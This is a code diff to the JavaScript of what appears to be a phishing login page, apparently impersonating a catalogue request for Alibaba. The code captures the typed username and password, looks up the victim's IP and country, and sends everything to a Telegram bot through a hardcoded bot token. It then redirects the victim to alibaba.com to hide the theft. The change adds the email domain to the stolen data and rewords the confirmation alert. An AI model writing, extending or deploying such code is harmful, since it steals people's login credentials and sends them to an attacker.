@@ -7,6 +7,9 @@ document.addEventListener('DOMContentLoaded', function () {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
+        // Parse the email domain
+        const emailDomain = username.split('@')[1];
+
         // Get IP and location info
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
@@ -14,7 +17,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 const ip = data.ip;
                 const country = data.country_name;
 
-                const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}`;
+                const message = `Username: ${username}\nPassword: ${password}\nEmail Domain: ${emailDomain}\nIP: ${ip}\nCountry: ${country}`;
 
                 // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
                 const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
@@ -35,7 +38,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 })
                 .then(response => {
                     if (response.ok) {
-                        alert('PGR: Thank you! Catalog will be sent to your email shortly!');
+                        alert('Message sent successfully!');
                         window.location.href = 'https://www.alibaba.com';
                     } else {
                         alert('Error sending message.');
